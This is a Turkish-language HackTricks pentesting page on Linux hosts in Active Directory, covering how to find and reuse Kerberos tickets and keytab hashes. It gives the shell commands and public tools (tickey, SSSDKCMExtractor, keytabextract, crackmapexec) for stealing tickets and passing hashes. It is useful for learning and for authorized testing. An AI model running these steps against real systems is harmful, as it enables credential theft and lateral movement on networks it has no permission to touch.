# Linux Active Directory

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR göndererek paylaşın**.

</details>

Bir Linux makinesi aynı zamanda bir Active Directory ortamında bulunabilir.

Bir AD içindeki bir Linux makinesi, **farklı CCACHE biletlerini dosyalarda depolayabilir. Bu biletler, diğer kerberos biletleri gibi kullanılabilir ve kötüye kullanılabilir**. Bu biletleri okumak için, biletin kullanıcı sahibi veya **makinedeki root** olmanız gerekmektedir.

## Sorgulama

### Linux üzerinden AD sorgulama

Linux'ta bir AD'ye erişiminiz varsa (veya Windows'ta bash), AD'yi sorgulamak için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) kullanabilirsiniz.

Linux üzerinden AD'yi sorgulamanın **diğer yollarını öğrenmek için** aşağıdaki sayfayı kontrol edebilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA, öncelikle **Unix** ortamları için Microsoft Windows **Active Directory**'ye bir açık kaynaklı **alternatif**tir. Active Directory'ye benzer şekilde yönetim için bir MIT **Kerberos** Anahtar Dağıtım Merkezi ile birleşik bir **LDAP dizini** içerir. CA ve RA sertifika yönetimi için Dogtag **Sertifika Sistemi**'ni kullanarak **çok faktörlü** kimlik doğrulama, akıllı kartlar da dahil olmak üzere destekler. Unix kimlik doğrulama süreçleri için SSSD entegredir. Daha fazlasını öğrenmek için:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Biletlerle Oynamak

### Bileti Geçir

Bu sayfada, bir Linux ana bilgisayarında **kerberos biletlerini bulabileceğiniz farklı yerleri** bulacaksınız, aşağıdaki sayfada bu CCache bilet formatlarını Kirbi'ye (Windows'ta kullanmanız gereken format) dönüştürmeyi ve ayrıca bir PTT saldırısı gerçekleştirmeyi nasıl yapacağınızı öğrenebilirsiniz:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmp'den CCACHE bilet yeniden kullanımı

CCACHE dosyaları, Kerberos kimlik bilgilerini **saklamak için kullanılan ikili formatlardır** ve genellikle `/tmp` dizininde 600 izinleriyle saklanır. Bu dosyalar, kullanıcının UID'sine karşılık gelen **`krb5cc_%{uid}`** ad biçimine sahiptir. Kimlik doğrulama biletinin doğrulanması için, **`KRB5CCNAME`** ortam değişkeni, istenen bilet dosyasının yoluna ayarlanmalı ve yeniden kullanımını etkinleştirmelidir.

Geçerli kimlik doğrulama için kullanılan biletin listesini `env | grep KRB5CCNAME` komutuyla alabilirsiniz. Format taşınabilir ve bilet, `export KRB5CCNAME=/tmp/ticket.ccache` komutuyla ortam değişkeni ayarlanarak **yeniden kullanılabilir**. Kerberos bilet adı formatı `krb5cc_%{uid}` şeklindedir, burada uid kullanıcı UID'sidir.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Anahtar halkasından CCACHE biletinin yeniden kullanımı

**Bir işlemin belleğinde depolanan Kerberos biletleri**, özellikle makinenin ptrace koruması devre dışı bırakıldığında (`/proc/sys/kernel/yama/ptrace_scope`), çıkarılabilir. Bu amaçla kullanışlı bir araç, [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur ve oturumlara enjekte ederek biletleri `/tmp` dizinine döker.

Bu aracı yapılandırmak ve kullanmak için aşağıdaki adımlar izlenir:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Bu işlem, çeşitli oturumlara enjekte etmeyi deneyecek ve başarılı olduğunu, çıkarılan biletleri `/tmp` dizininde `__krb_UID.ccache` adlandırma kuralıyla saklayarak belirtecektir.


### SSSD KCM'den CCACHE bilet yeniden kullanımı

SSSD, veritabanının `/var/lib/sss/secrets/secrets.ldb` yolunda bir kopyasını tutar. Karşılık gelen anahtar, varsayılan olarak yalnızca **root** izinlerine sahipseniz okunabilir olarak saklanır ve `/var/lib/sss/secrets/.secrets.mkey` yolunda gizli bir dosya olarak depolanır.

`SSSDKCMExtractor`'ı --database ve --key parametreleriyle çağırmak, veritabanını ayrıştıracak ve **şifreleri çözecektir**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Kimlik bilgisi önbelleği Kerberos blogu**, Mimikatz/Rubeus'a iletilmek üzere kullanılabilir bir Kerberos CCache dosyasına dönüştürülebilir.

### Anahtar tablosundan CCACHE biletinin yeniden kullanımı
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab dosyasından hesapları çıkarın

Kök ayrıcalıklarıyla çalışan hizmetler için önemli olan hizmet hesabı anahtarları, güvenli bir şekilde **`/etc/krb5.keytab`** dosyalarında saklanır. Bu anahtarlar, hizmetler için şifreler gibi sıkı bir gizlilik gerektirir.

Keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Bu araç, anahtar ayrıntılarını, özellikle anahtar türü 23 olarak tanımlandığında kullanıcı kimlik doğrulaması için **NT Hash**'i görüntülemek için tasarlanmıştır.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Linux kullanıcıları için, **`KeyTabExtract`** işlevselliği sunar ve NTLM hash yeniden kullanımı için kullanılabilecek RC4 HMAC hash'inin çıkarılmasını sağlar.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS üzerinde, **`bifrost`** anahtar tablosu dosyası analizi için bir araç olarak hizmet verir.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Çıkarılan hesap ve hash bilgileri kullanılarak, **`crackmapexec`** gibi araçlar kullanılarak sunuculara bağlantılar kurulabilir.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Referanslar
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
